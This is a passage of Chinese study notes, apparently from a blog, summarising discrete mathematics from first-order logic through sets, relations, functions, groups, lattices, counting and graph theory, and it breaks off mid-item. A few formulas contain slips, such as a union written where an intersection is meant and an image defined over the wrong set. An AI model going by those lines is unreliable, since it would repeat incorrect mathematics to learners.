一阶逻辑等值演算与推理"></a>第5章 一阶逻辑等值演算与推理</h1><h2 id="基础知识-4"><a href="#基础知识-4" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li>一阶逻辑等值式与置换规则<ul><li><strong>等值式</strong>：设A，B为一阶逻辑公式，若A$\leftrightarrow$B为永真式，则称A与B等值，记作A$\Leftrightarrow$B.</li><li><strong>基本的等值式</strong>：<ul><li><a href="https://wenku.baidu.com/view/61b8cb43a8956bec0975e346.html" target="_blank" rel="noopener">等值式模式</a>的代换实例</li><li><a href="https://wenku.baidu.com/view/61b8cb43a8956bec0975e346.html" target="_blank" rel="noopener">一阶逻辑中的重要等值式</a>：消去量词等值式、量词否定等值式、量词辖域收缩与扩张等值式、量词分配等值式</li></ul></li><li><strong>两个主要规则</strong>：<ul><li>置换规则</li><li>换名规则</li></ul></li></ul></li><li>一阶逻辑的前束范式<ul><li><strong>前束范式</strong></li><li><strong>求前束范式</strong>：利用重要的等值式、置换规则、换名规则等进行等值演算求解。</li></ul></li><li>一阶逻辑的推理理论<ul><li><strong>自然推理系统N的推理规则</strong>：前提引入、结论引入、置换、假言推理、附加、化简、拒取式、假言三段论、析取三段论、构造性二难、合取引入、全称量词消去($\forall$-)、全称量词引入($\forall$+)、存在量词消去($\exists$-)、存在量词引入($\exists$+)</li></ul></li></ol><h2 id="题型汇总-4"><a href="#题型汇总-4" class="headerlink" title="题型汇总"></a>题型汇总</h2><ul><li><strong>由已知的等值式证明新的等值式</strong></li><li><strong>在有限的个体域内消去公式中的量词</strong></li><li><strong>求给定公式的前束范式</strong></li><li><strong>在自然推理系统N中构造推理的证明</strong></li><li><strong>在自然推理系统N中，构造用自然语言描述的推理的证明</strong></li></ul><hr><h1 id="第6章-集合代数"><a href="#第6章-集合代数" class="headerlink" title="第6章 集合代数"></a>第6章 集合代数</h1><h2 id="基础知识-5"><a href="#基础知识-5" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li>集合的基本概念<ul><li><strong>元素与集合</strong>：集合、元素(成员)、$\in$、$\notin$</li><li><strong>特殊集合</strong>：N、Q、R、C、$\emptyset$、全集E、A的幂集P(A)={x|x$\subseteq$A}</li><li><strong>集合的表示法</strong>：列元素法、谓词表示法、文氏图</li><li><strong>集合之间的关系</strong>：$\subseteq$，$\not \subseteq$，$\subset$，$\not \subset$，$=$，$\not =$</li><li><strong>重要结果</strong>：<ul><li>空集是任何集合的子集</li><li>对任何集合A，都有A$\notin$A</li><li>如果集合|A|=n, 则|P(A)|=2<sup>n</sup> </li></ul></li></ul></li><li>集合的运算<ul><li><strong>集合的初级运算</strong>：$\bigcup$、$\bigcap$、相对补$-$、绝对补~、对称差$\bigoplus$ </li><li><strong>集合的广义运算</strong>：广义并$\bigcup$A={ {x|$\exists$z(z$\in$A$\bigwedge$x$\in$z)} }、广义交$\bigcap$A={ {x|$\forall$z(z$\in$A$\rightarrow$x$\in$z)} }</li><li><strong>转化广义并、交</strong>：$\bigcup${A<sub>1</sub>,A<sub>2</sub>,…,A<sub>n</sub>}=A<sub>1</sub>$\bigcup$A<sub>2</sub>$\bigcup$…$\bigcup$A<sub>n</sub>，$\bigcap${A<sub>1</sub>,A<sub>2</sub>,…,A<sub>n</sub>}=A<sub>1</sub>$\bigcap$A<sub>2</sub>$\bigcap$…$\bigcap$A<sub>n</sub></li><li><strong>运算的优先权规定</strong>：一类运算($\bigcup$、$\bigcap$、相对补$-$、对称差$\bigoplus$ )优先顺序由括号确定，二类运算(绝对补~、广义运算、幂集)由右向左进行、二类运算优先于一类运算。</li></ul></li><li>有穷集合元素的计数<ul><li><strong>计数方法</strong>：文氏图、包含排斥原理</li><li><strong><a href="https://wenku.baidu.com/view/c47fa19769dc5022aaea00a9.html" target="_blank" rel="noopener">包含排斥原理</a></strong></li><li><strong><a href="https://baike.baidu.com/item/全错位排列" target="_blank" rel="noopener">错位排斥数</a></strong></li></ul></li><li><a href="https://wenku.baidu.com/view/33f57008bed5b9f3f90f1cf2.html" target="_blank" rel="noopener"><strong>集合恒等式</strong></a>：幂等律、结合律、交换律、分配律、同一律、零律、排中律、矛盾律·、吸收律、德摩根律、双重否定律</li></ol><h2 id="题型汇总-5"><a href="#题型汇总-5" class="headerlink" title="题型汇总"></a>题型汇总</h2><ul><li><strong>判断元素与集合的隶属关系以及集合之间的包含关系</strong></li><li><strong>集合的基本运算题</strong></li><li><strong>有关集合性质的分析题</strong></li><li><strong>集合相等或者包含的证明题</strong>：<ul><li>证明P$\subseteq$Q的基本方法：命题演算法、包含的传递性、反证法 </li><li>证明P$=$Q的基本方法：命题演算法、恒等变形、反证法、利用已知等式通过运算得到新的等式 </li></ul></li><li><strong>有穷集合的计数问题</strong></li></ul><hr><h1 id="第7章-二元关系"><a href="#第7章-二元关系" class="headerlink" title="第7章 二元关系"></a>第7章 二元关系</h1><h2 id="基础知识-6"><a href="#基础知识-6" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li><p>有序对和笛卡儿积</p><ul><li><strong>有序对</strong>：有序对(序偶)、第一元素、第二元素、性质</li><li><strong>笛卡儿积</strong></li><li><strong>笛卡儿积运算性质</strong>：<ul><li>A×$\emptyset$=$\emptyset$, $\emptyset$×A=$\emptyset$</li><li>A×B$\not =$B×A(当A$\not =$ $\emptyset$ $\bigwedge$ A$\not =$ $\emptyset$ $\bigwedge$A$\not =$B时)</li><li>(A×B)×C$\not =$A×(B×C)(当A$\not =$ $\emptyset$ $\bigwedge$ A$\not =$ $\emptyset$ $\bigwedge$ C $\not =$ $\emptyset$时)</li><li>对并和交满足分配律</li></ul></li><li><strong>笛卡儿积中元素的计数</strong>：|A|=m, |B|=n, |A×B|=mn</li></ul></li><li><p>二元关系</p><ul><li><strong>二元关系</strong>：二元关系（简称关系）{条件：集合非空，且他的元素都是有序对；集合为空集}记作R，若<x,y>$\in$R,则记作xRy，否则记作x$\not R$y</x,y></li><li><strong>从A到B的二元关系与A上的二元关系</strong>：A×B的子集是从A到B的二元关系，当A=B时就是A上的二元关系。若|A|=n,|B|=m,|A×B|=mn，从A到B的二元关系有2<sup>mn</sup>，A上的关系有2<sup>n<sup>2</sup>&lt;/sup&gt;</sup></li><li><strong>A上的特殊关系</strong>：空关系$\emptyset$、全域关系E<sub>A</sub>、恒等关系I<sub>A</sub>，<em>小于等于关系，整除关系，包含关系</em></li><li><strong>关系的表示</strong>：集合表达式、关系矩阵、关系图</li></ul></li><li><p>关系的运算</p><ul><li><strong>定义</strong>：定义域(domR)、值域(ranR)、域(fldR)、逆关系(逆，R<sup>-1</sup>)、右复合(F$\circ$G)、限制(R$\upharpoonright$A={<x,y>|xRy$\bigwedge$x$\in$A})、像(R[A]=ran(R$\upharpoonright$A))、n次幂(R<sup>n</sup>){定义：R<sup>0</sup>={<x,x>|x$\in$A}=I<sub>A</sub>; R<sup>n+1</sup>=R<sup>n</sup>$\circ$R}</x,x></x,y></li><li><strong>运算顺序</strong>：关系运算中逆运算优先于其他运算，而所有的关系运算都优先于集合运算，对于没有规定优先级的运算以括号决定运算顺序。</li><li><strong>基本运算的性质</strong>：<ul><li>(F<sup>-1</sup>)<sup>-1</sup>=F</li><li>domF<sup>-1</sup>=ranF, ranF<sup>-1</sup>=domF</li><li>(F$\circ$G)$\circ$H=F$\circ$(G$\circ$H)</li><li>(F$\circ$G)<sup>-1</sup>=G<sup>-1</sup>$\circ$F<sup>-1</sup></li><li>R$\circ$I<sub>A</sub>=I<sub>A</sub>$\circ$R=R</li><li>F$\circ$(G$\bigcup$H)=F$\circ$G$\bigcup$F$\circ$H</li><li>(G$\bigcup$H)$\circ$F=G$\circ$F$\bigcup$H$\circ$F</li><li>F$\circ$(G$\bigcap$H)$\subseteq$F$\circ$G$\bigcap$F$\circ$H</li><li>(G$\bigcap$H)$\circ$F$\subseteq$G$\circ$F$\bigcap$H$\circ$F</li><li>F$\upharpoonright$(A$\bigcup$B)=F$\upharpoonright$A$\bigcup$F$\upharpoonright$B</li><li>F[A$\bigcup$B]=F[A]$\bigcup$F[B]</li><li>F$\upharpoonright$(A$\bigcap$B)=F$\upharpoonright$A$\bigcap$F$\upharpoonright$B</li><li>F[A$\bigcup$B]$\subseteq$F[A]$\bigcup$F[B]</li><li>设A为n元集，R是A上的关系，则存在自然数s和t，使得R<sup>s</sup>=R<sup>t</sup></li><li>R<sup>m</sup>$\circ$R<sup>n</sup>=R<sup>m+n</sup></li><li>(R<sup>m</sup>)<sup>n</sup>=R<sup>mn</sup></li><li>设R为A上的关系，若存在自然数s和t(s$&lt;$t)，使得R<sup>s</sup>=R<sup>t</sup>则：<ul><li>对任何k$\in$N有R<sup>s+k</sup>=R<sup>t+k</sup></li><li>对任何k,i$\in$N有R<sup>s+kp+i</sup>=R<sup>s+i</sup>，其中p=t-s</li><li>令S={R<sup>0</sup>,R<sup>1</sup>,$\cdots$,R<sup>n</sup>},则对任意的q$\in$N有R<sup>q</sup>$\in$S</li></ul></li></ul></li></ul></li><li><p>关系的性质</p><ul><li><p><strong>性质</strong>：</p><ul><li>自反{ $\forall$x(x$\in$A$\rightarrow$<x,x>$\in$R) }</x,x></li><li>反自反{ $\forall$x(x$\in$A$\rightarrow$<x,x>$\not \in$R) }</x,x></li><li>对称{ $\forall$x$\forall$y(x,y$\in$A$\bigwedge$<x,y>$\in$R$\rightarrow$<y,x>$\in$R) }</y,x></x,y></li><li>反对称{ $\forall$x$\forall$y(x,y$\in$A$\bigwedge$<x,y>$\in$R$\bigwedge$<y,x>$\in$R$\rightarrow$x=y) }</y,x></x,y></li><li>传递{ $\forall$x$\forall$y$\forall$z(x,y,z$\in$A$\bigwedge$<x,y>$\in$R$\bigwedge$<y,z>$\in$R$\rightarrow$<x,z>$\in$R) }</x,z></y,z></x,y></li></ul></li><li><p><strong>性质表</strong></p><p>|            |          自反性           |              反自反性               |                         对称性                         |                      反对称性                      |                            传递性                            |<br>| :————: | :———————————-: | :————————————————-: | :——————————————————————————: | :————————————————————————: | :—————————————————————————————: |<br>| 集合表达式 | I<sub>A</sub>$\subseteq$R | R$\bigcap$I<sub>A</sub>=$\emptyset$ |                    R=R<sup>-1</sup>                    |  R$\bigcap$R<sup>-1</sup>$\subseteq$I<sub>A</sub>  |                    R$\circ$R$\subseteq$R                     |<br>|  关系矩阵  |     主对角线元素全是1     |          主对角线元素全是0          |                     矩阵是对称矩阵                     | 若r<sub>ij</sub>=1且i$\not =$j，则r<sub>ji</sub>=0 |       对M<sup>2</sup>中1所在的位置，M中相应的位置都是1       |<br>|   关系图   |      每个顶点都有环       |          每个顶点都没有环           | 如果两个顶点之间有边，则一定是一对方向相反的边(无单边) |  如果两个顶点之间有边，则一定是一条有向边(无双边)  | 如果顶点x<sub>i</sub>到x<sub>j</sub>有边，x<sub>j</sub>到x<sub>k</sub>有边，则从x<sub>i</sub>到x<sub>k</sub>也有边 |</p></li><li><p><strong>关系的性质与运算之间的联系</strong>：</p><p>|                                     | 自反性 | 反自反性 | 对称性 | 反对称性 | 传递性 |<br>| :————————————————-: | :——: | :———: | :——: | :———: | :——: |<br>|     R<sub>1</sub><sup>-1</sup>      |   √    |    √     |   √    |    √     |   √    |<br>| R<sub>1</sub>$\bigcap$R<sub>2</sub> |   √    |    √     |   √    |    √     |   √    |<br>| R<sub>1</sub>$\bigcup$R<sub>2</sub> |   √    |    √     |   √    |    ×     |   ×    |<br>|     R<sub>1</sub>-R<sub>2</sub>     |   ×    |    √     |   √    |    √     |   ×    |<br>|  R<sub>1</sub>$\circ$R<sub>2</sub>  |   √    |    ×     |   ×    |    ×     |   ×    |</p></li></ul></li><li><p>关系的闭包</p><ul><li><strong>定义</strong>：自反包(r(R)=R$\bigcup$R<sup>0</sup>)、对称闭包(s(R)=R$\bigcup$R<sup>-1</sup>)、传递闭包(t(R)=R$\bigcup$R<sup>2</sup>$\bigcup$R<sup>3</sup>$\bigcup$ $\cdots$)</li><li><strong>关系矩阵表示</strong>：M<sub>r</sub>=M+E, M<sub>s</sub>=M+M’, M<sub>t</sub>=M+M<sup>2</sup>+M<sup>3</sup>+$\cdots$</li><li><strong>关系图表示</strong>：<ul><li>G<sub>r</sub>: 考察G的每个顶点，若没有环就加一个环</li><li>G<sub>s</sub>: 考察G的每条边，若有单向边就补边改为双向边</li><li>G<sub>t</sub>: 考察G的路径，补边使其可达则直达(特例：2步及以上回到本身补环)</li></ul></li><li><strong>定理</strong>：<ul><li>设R是非空集合A上的关系，则：R是自反的当且仅当r(R)=R；R是对称的当且仅当s(R)=R；R是传递的当且仅当t(R)=R。</li><li>设R1，R2是非空集合A上的关系，且R<sub>1</sub>$\subseteq$R<sub>2</sub>则：r(R<sub>1</sub>)$\subseteq$r(R<sub>2</sub>); s(R<sub>1</sub>)$\subseteq$s(R<sub>2</sub>); t(R<sub>1</sub>)$\subseteq$t(R<sub>2</sub>)。</li><li>设R是非空集合A上的关系，则：R自反$\rightarrow$s(R)与t(R)自反、R对称$\rightarrow$r(R)与t(R)对称、R是传递$\rightarrow$r(R)传递</li><li>tsr(R)=t(s(r(R))){传递闭包运算在对称闭包运算后面}  </li></ul></li></ul></li><li><p>等价关系与划分</p><ul><li><strong>等价关系</strong>：A上的自反、对称和传递的关系。（设R是一个等价关系，若<x,y>$\in$R, 称x等价于y，记作x~y）</x,y></li><li><strong>等价类</strong>：设R是非空集合A上的等价关系，$\forall$x$\in$A，令[x]<sub>R</sub>={y|y$\in$A$\bigwedge$xRy}称[x]<sub>R</sub>为x关于R的等价类，简称x的等价类，简记为[x]或$\overline{a}$</li><li><strong>等价类的性质</strong>：设R为非空集合A上的等价关系，则：<ul><li>$\forall$x$\in$A, [x]是A的非空子集</li><li>$\forall$x,y$\in$A, xRy$\rightarrow$[x]=[y]</li><li>$\forall$x,y$\in$A, x$\not R$y$\rightarrow$[x]、[y]不相交</li><li>$\bigcup${[x]|x$\in$A}=A</li></ul></li><li><strong>商集</strong>：设R为非空集合A上的等价关系，以R的所有等价类作为元素的集合称为A关于R的商集，记作A/R，即A/R={[x]<sub>R</sub>|x$\in$A}</li><li><strong>划分</strong>：设A为非空集合，若A的子集族π(π$\subseteq$P(A), 是A的子集构成的集合)满足($\emptyset$ $\not \in$π、$\forall$x$\forall$y(x,y$\in$π$\bigwedge$$x\not =y$ $\rightarrow$x$\bigcap$y=$\emptyset$)、$\bigcup$π=A)则称π是A的一个划分，称π中的元素为A的划分块。</li><li><strong>关系</strong>：商集就是A的一个划分，并且不同的商集将对应于不同的划分。A上的等价关系与A的划分一一对应。</li></ul></li><li><p>偏序关系：</p><ul><li><strong>偏序关系</strong>：设R为非空集合A上的关系，如果R是自反的、反对称的、传递的，则称R为A上的偏序关系，记作$\preccurlyeq$，设为偏序关系，<x,y>$\in$ $\preccurlyeq$, 则记作x$\preccurlyeq$y, 读作x”小于等于”y。{含义：依照这个序，x排在y前面或者x就是y}、{eg: 恒等关系、小于等于、整除、包含关系是偏序关系，一般全域关系不是}</x,y></li><li><strong>全序关系</strong>：设R为非空集合A上的偏序关系，如果$\forall$x,y$\in$A，x与y都是可比的，则称R为A上的全序关系(或线序关系)</li><li><strong>偏序集</strong>：集合A和A上的偏序关系$\preccurlyeq$一起称为偏序集，记作<a,$\preccurlyeq$></a,$\preccurlyeq$></li><li><strong>覆盖</strong>：设<a,$\preccurlyeq$>为偏序集，$\forall$x,y$\in$A，如果x$&lt;$y且不存在z$\in$A使得x$&lt;$z$&lt;$y, 则称y覆盖x</a,$\preccurlyeq$></li><li><strong>哈斯图</strong>：有穷偏序集<a,$\preccurlyeq$>可以用哈斯图表示。在哈斯图中用结点表示A中的元素，如果对于不同的结点x和y，x$&lt;$y, 那么x画在y的下方；如果y覆盖x，则在x和y之间连一条线。</a,$\preccurlyeq$></li><li><strong>特殊元素</strong>：<a,$\preccurlyeq$>，B$\subseteq$A, y$\in$B, 则：<ul><li>$\forall$x(x$\in$B$\rightarrow$y$\preccurlyeq$x)$\rightarrow$y为B的最小元</li><li>$\forall$x(x$\in$B$\rightarrow$x$\preccurlyeq$y)$\rightarrow$y为B的最大元  </li><li>$\forall$x(x$\in$B$\bigwedge$x$\preccurlyeq$y$\rightarrow$x=y)$\rightarrow$y为B的极小元  </li><li>$\forall$x(x$\in$B$\bigwedge$y$\preccurlyeq$x$\rightarrow$x=y)$\rightarrow$y为B的极大元  </li></ul></a,$\preccurlyeq$></li><li><strong>界</strong>：<a,$\preccurlyeq$>，B$\subseteq$A, y$\in$A, 则：<ul><li>$\forall$x(x$\in$B$\rightarrow$x$\preccurlyeq$y)$\rightarrow$y为B的上界</li><li>$\forall$x(x$\in$B$\rightarrow$y$\preccurlyeq$x)$\rightarrow$y为B的下界  </li><li>令C={y|y为B上界}，则称C的最小元为B的最小上界或上确界</li><li>令D={y|y为B下界}，则称D的最大元为B的最大下界或下确界</li></ul></a,$\preccurlyeq$></li></ul></li></ol><h2 id="题型汇总-6"><a href="#题型汇总-6" class="headerlink" title="题型汇总"></a>题型汇总</h2><ul><li><strong>有序对与笛卡儿积</strong></li><li><strong>关系的基本概念</strong></li><li><strong>关系的三种表示法即关系性质的判断</strong></li><li><strong>关系的基本运算</strong></li><li><strong>求关系的闭包</strong></li><li><strong>证明涉及关系的恒等式或包含式</strong></li><li><strong>证明关系的性质</strong></li><li><strong>等价关系的等价类、商集及划分的对应</strong></li><li><strong>偏序集与哈斯图</strong></li></ul><hr><h1 id="第8章-函数"><a href="#第8章-函数" class="headerlink" title="第8章 函数"></a>第8章 函数</h1><h2 id="基础知识-7"><a href="#基础知识-7" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li>函数的定义与性质<ul><li><strong>函数</strong>：设F为二元关系，若$\forall$x$\in$domF都存在唯一的y$\in$ranF使xFy成立，则称F为函数</li><li><strong>函数相等</strong>：设F,G为函数，则F=G$\Leftrightarrow$F$\subseteq$G$\bigwedge$G$\subseteq$F{满足：domF=domG、$\forall$x$\in$domF=domG，都有F(x)=G(x)}</li><li><strong>从A到B的函数</strong>：设A，B为集合，如果f为函数，且domf=A, ranf$\subseteq$B，则f称为从A到B的函数，记作f: A$\rightarrow$B</li><li><strong>B上A</strong>：所有从A到B的函数的集合记作B<sup>A</sup>，读作“B上A”。符号化表示为B<sup>A</sup>={f|f:A$\rightarrow$B} {|A|=m,|B|=n,|B<sup>A</sup>|=n<sup>m</sup>；A=$\emptyset$ $\bigwedge$B=$\emptyset$ $\rightarrow$B<sup>A</sup>=$\emptyset$<sup>$\emptyset$</sup>={$\emptyset$}、A=$\emptyset$ $\bigwedge$B$\not =$ $\emptyset$ $\rightarrow$B<sup>A</sup>=B<sup>$\emptyset$</sup>={$\emptyset$}、A$\not =$ $\emptyset$ $\bigwedge$B=$\emptyset$ $\rightarrow$B<sup>A</sup>=$\emptyset$<sup>A</sup>=$\emptyset$}</li><li><strong>像</strong>：设f: A$\rightarrow$B, A<sub>1</sub>$\subseteq$A，B<sub>1</sub>$\subseteq$B，f(A<sub>1</sub>)={f(x)|x$\in$B<sub>1</sub>}称为A<sub>1</sub>在f下的像。f(A)称为函数的像</li><li><strong>完全原像</strong>：设f: A$\rightarrow$B, B<sub>1</sub>$\subseteq$B, f<sup>-1</sup>(B<sub>1</sub>)={x|x$\in$A$\bigwedge$f(x)$\in$B<sub>1</sub>}称为B<sub>1</sub>在f下的完全原像。{一般来说，像与完全原像满足：A<sub>1</sub>$\subseteq$f<sup>-1</sup>(f(A<sub>1</sub>)), f<sup>-1</sup>(f(B<sub>1</sub>))$\subseteq$B<sub>1</sub>}</li><li><strong>函数的性质</strong>：设f:A$\rightarrow$B:<ul><li>若ranf=B，则称f:A$\rightarrow$B是满射的</li><li>若$\forall$y$\in$ranf都存在唯一的x$\in$A使得f(x)=y，则称f:A$\rightarrow$B是单射的</li><li>若f:A$\rightarrow$B既是满射又是单射，则称f:A$\rightarrow$B是双射的(或一一映像)</li></ul></li><li><strong>常用函数</strong>：常函数、恒等函数、单调函数、集合的特征函数、自然映射、定义在自然数集合上的计数函数</li></ul></li><li>函数的复合与反函数<ul><li><strong>有关函数复合的定理</strong></li><li><strong>有关反函数的定理</strong></li></ul></li><li>双射与集合的基数</li></ol><h2 id="题型汇总-7"><a href="#题型汇总-7" class="headerlink" title="题型汇总"></a>题型汇总</h2><ul><li><strong>函数定义与从A到B的函数f:A$\rightarrow$B的定义</strong></li><li><strong>判断函数的性质</strong></li><li><strong>有关函数的计算题</strong></li><li><strong>针对给定集合A和B，构造双射函数f:A$\rightarrow$B</strong></li><li><strong>证明有关函数的等式或者函数的单射、满射性质</strong></li><li><strong>证明集合等势或者优势</strong></li><li><strong>计算或者证明集合的基数</strong></li></ul><hr><h1 id="第9章-代数系统"><a href="#第9章-代数系统" class="headerlink" title="第9章 代数系统"></a>第9章 代数系统</h1><ol><li>二元运算及其性质<ul><li><strong>定义</strong>：设S为集合，函数f:SxS$\rightarrow$S称为S上的二元运算，简称二元运算。</li><li>验证一个运算是否为集合S上的二元运算：<ul><li>S中的任何两个元素都可以进行这种运算，且运算结果是唯一的</li><li>S中的任何两个元素的运算结果都属于S，即S对该运算是封闭的</li></ul></li><li><strong>一元运算定义</strong>：设S为集合，函数f:S$\rightarrow$S称为S上的一元运算，简称一元运算。</li><li>单位元：唯一</li><li>零元：唯一</li><li>逆元：唯一</li></ul></li><li>代数系统<ul><li><strong>定义</strong>：非空集合S和S上的k个一元或二元运算$f_1,f_2,…,f_k$组成的系统称作一个代数系统，简称代数，记作$<s,f_1,f_2,...f_k>$</s,f_1,f_2,...f_k></li><li><strong>同类型的代数系统</strong>：如果两个代数系统中运算的个数相同，对应运算的元数相同，且代数常数的个数也相同，则称这两个代数系统具有相同的构成成分，也称他们是同类型的代数系统。不一定具有相同的运算性质。</li><li><strong>子代数</strong>：设$V=<s,f_1,f_2,...f_k>$是代数系统，$B\subseteq S$，如果B对$f_1,f_2,…,f_k$都是封闭的，且B和S具有相同的代数常数，则称$<b,f_1,f_2,...f_k>$是V的子代数系统，简称子代数，有时将子代数系统简记为B。</b,f_1,f_2,...f_k></s,f_1,f_2,...f_k></li></ul></li><li>代数系统的同态与同构<ul><li>设$V_1=<a,\circ>$和$V_2=<b,*>$是同类型的代数系统，f:A$\rightarrow$B，且$\forall$x,y$\in$A有$f(x\circ y)=f(x)*f(y)$，则称f是$V_1$到$V_2$的同态映射，简称为同态。</b,*></a,\circ></li><li>单同态、满同态、同构；</li><li>自同态</li></ul></li></ol><hr><h1 id="第10章-群与环"><a href="#第10章-群与环" class="headerlink" title="第10章 群与环"></a>第10章 群与环</h1><p><table>          <tr>               <td>《S, o》</td>               <td>封闭性</td>               <td>结合律</td>               <td>含幺元</td>               <td>所有元素都有逆元</td>               <td>交换律</td>               <td>《a={a<sup>z</sup>}</td>               <td>消去律</td>               <td>含零元</td>          </tr>          <tr>               <td>代数系统</td>               <td>√</td>               <td></td>               <td></td>               <td></td>               <td></td>               <td></td>               <td></td>               <td></td>          </tr>          <tr>               <td>半群</td>               <td>√</td>               <td>√</td>               <td></td>               <td></td>               <td>交换半群</td>               <td></td>               <td></td>               <td></td>          </tr>          <tr>               <td>独异点</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td></td>               <td></td>               <td></td>               <td></td>               <td></td>          </tr>          <tr>               <td>群</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td></td>               <td></td>               <td>√</td>               <td>×</td>          </tr>          <tr>               <td>Abel群</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td></td>               <td>√</td>               <td>×</td>          </tr>          <tr>               <td>循环群</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td>√</td>               <td>×</td>          </tr>      </table></p><ol><li>群的定义及性质<ul><li><strong>定义</strong>：<ul><li>设$V=<s,\circ>$是代数系统，$\circ$为二元运算，如果$\circ$为二元运算，如果$\circ$是可结合的，则称V为半群；</s,\circ></li><li>设$V=<s,\circ>$是半群，若$e\in S$是关于$\circ$运算的单位元，则称V是幺半群，也称作独异点；</s,\circ></li><li>设$V=<s,\circ>$是独异点，$e\in S$是关于$\circ$运算的单位元，若$\forall a\in S$，有$a^{-1}\in S$，则称V是群，通常将群记作G；</s,\circ></li><li>若群G中的二元运算是可交换的，则称G为交换群或Abel群；</li><li>若存在$a\in G$使得$G=<a>$，则称G为循环群，称a为G的生成元；</a></li></ul></li><li>若群G是有穷集，则称G是有限群，否则是无限群。</li><li>群G的基数是群G的阶</li><li>只含单位元的群称为平凡群</li><li>设G为群，$a\in G$，使得等式$a^k=e$成立的最小正整数k称为a的阶，记作$|a|=k$，这时称a为k阶元。若不存在这样的正整数k，则称a为无限阶元。</li><li><strong>结论</strong>：设G为有限群，则G中阶大于2的元素为偶数个。</li></ul></li><li>子群与群的陪集分解<ul><li>定义</li><li>3个判定定理</li><li>由a生成的子群</li><li>中心</li><li>陪集、正规子群、H在G中的指数（$[G:H]$）</li><li><strong>拉格朗日定理</strong>：设G是有限群，H是G的子群，则$|G|=|H|*[G:H]$</li></ul></li><li>循环群与置换群<ul><li>循环群生成元个数</li><li>循环子群的定理</li><li>置换群：n元置换、k阶轮换、对换、奇置换偶置换(各$n!/2$)、n元对称群、n元交错群、n元置换群</li></ul></li><li>环与域<ul><li>定义</li><li>交换环、含幺环、无零因子环、整环、域</li><li><strong>费马小定理</strong>：如果p为素数，则对所有的$n!=0(mod p)$有$n^{p-1}=1(modp)$</li></ul></li></ol><h1 id="第11章-格与布尔代数"><a href="#第11章-格与布尔代数" class="headerlink" title="第11章 格与布尔代数"></a>第11章 格与布尔代数</h1><ol><li>格与布尔代数是具有两个二元运算的代数系统。</li><li>格：设<s,$\preccurlyeq$>是偏序集，如果$\forall x,y\in S$，{x, y}都有最小上界和最大下界，则称S关于偏序$\preccurlyeq$作为一个格。</s,$\preccurlyeq$></li><li>分配格、全上界、全下界、有界格、补元、有补格</li><li>布尔代数：如果一个格是有补分配格，则称他是布尔格或者布尔代数。</li></ol><h1 id="第12章-基本的组合计数公式"><a href="#第12章-基本的组合计数公式" class="headerlink" title="第12章 基本的组合计数公式"></a>第12章 基本的组合计数公式</h1><ol><li>加法法则与乘法法则<ul><li>设A为n元集，则：<ul><li>A上的自反关系个数：$2^{n^2-n}$</li><li>A上的对称关系个数：$2^{(n^2+n)/2}$</li><li>A上的反对称关系个数：$2^n3^{(n^2-n)/2}$</li><li>A上的函数个数：$n^n$</li><li>A上的双射函数的个数：$n!$</li></ul></li></ul></li><li>排列与组合<ul><li>$P(n,r)=n!/(n-r)!$</li><li>$C(n,r)=P(n,r)/r!$</li><li>环排列：$P(n,r)/r$</li></ul></li><li>二项式定理与组合恒等式</li></ol><h1 id="第13章-递推方程与生成函数"><a href="#第13章-递推方程与生成函数" class="headerlink" title="第13章 递推方程与生成函数"></a>第13章 递推方程与生成函数</h1><h1 id="第14章-图的基本概念"><a href="#第14章-图的基本概念" class="headerlink" title="第14章 图的基本概念"></a>第14章 图的基本概念</h1><ol><li>图<ul><li><strong>握手定理</strong>：在任何无向图中，所有顶点的度数之和等于边数的两倍。</li><li>任何图中，奇度顶点的个数是偶数。</li><li>同构</li><li>n阶无向完全图、n阶有向完全图、n阶竞赛图</li><li>k-正则图</li><li>子图、母图、真子图、导出的子图、生成的子图</li><li>补图、自补图</li><li>删除边、删除边集、删除点、删除点集、边的收缩、加新边</li></ul></li><li>通路与回路<ul><li>通路、回路、简单通路、简单回路、初级通路（路径）、初级回路（圈）、奇圈、偶圈</li></ul></li><li>图的连通性<ul><li>连通、连通图、非连通图、连通分支、连通分支数$p(G)$</li><li>点割集、割点、边割集、割边（桥）、点连通度、k-连通图、边连通度、k边-连通图</li><li>弱连通图、单项连通图、强连通图</li><li>强连通图判定定理：当且仅当D中存在经过每个顶点至少一次的回路</li><li>单向连通图判定定理：当且仅当D中存在经过每个顶点至少一次的通路</li><li>二部图、互补顶点子集、简单二部图、完全二部图</li><li>二部图判定定理：当且仅当D中无奇圈</li></ul></li></ol><h1 id="第15章-欧拉图与哈密顿图"><a href="#第15章-欧拉图与哈密顿图" class="headerlink" title="第15章 欧拉图与哈密顿图"></a>第15章 欧拉图与哈密顿图</h1><ol><li>欧拉图<ul><li>欧拉通路、欧拉回路、欧拉图、半欧拉图</li><li>规定平凡图为欧拉图</li><li>无向图G是欧拉图当且仅当G是连通图且没有奇度顶点</li><li>无向图G是半欧拉图当且仅当G是连通图且恰有两个奇度顶点</li><li>有向图D是欧拉图当且仅当D是强连通图且每个顶点的入度等于出度</li><li>有向图D是半欧拉图当且仅当D是单向连通图且恰有两个奇度顶点，其中一个顶点的入度比出度大1，一个顶点的出度比入度大1，其余顶点的入度等于出度。</li></ul></li><li>哈密顿图<ul><li>哈密顿通路、哈密顿回路、哈密顿图、半哈密顿图</li><li>规定平凡图为哈密顿图</li></ul></li></ol><h1 id="第16章-树"><a href="#第16章-树" class="headerlink" title="第16章 树"></a>第16章 树</h1><h1 id="第17章-平面图"><a href="#第17章-平面图" class="headerlink" title="第17章 平面图"></a>第17章 平面图</h1><h1 id="第18章-支配集、覆盖集、独立集、匹配与着色"><a href="#第18章-支配集、覆盖集、独立集、匹配与着色" class="headerlink" title="第18章 支配集、覆盖集、独立集、匹配与着色"></a>第18章 支配集、覆盖集、独立集、匹配与着色</h1><blockquote><p>均针对无向简单图</p></blockquote><ol><li>支配集、点覆盖集与点独立集<ul><li>支配集、极小支配集、最小支配集、支配数：分布式计算系统，设 $G=(V, E)$ 是无向简单图, $D \subseteq V$，若对于任意 $\boldsymbol{v} \in V-D$, 都存在 $u \in D$, 使得 $u v \in E$，则D是支配集<ul><li>完全图 $K_{n}(n \geq 3)$ 的支配数为1</li><li>完全二部图 $K_{m . n}$ 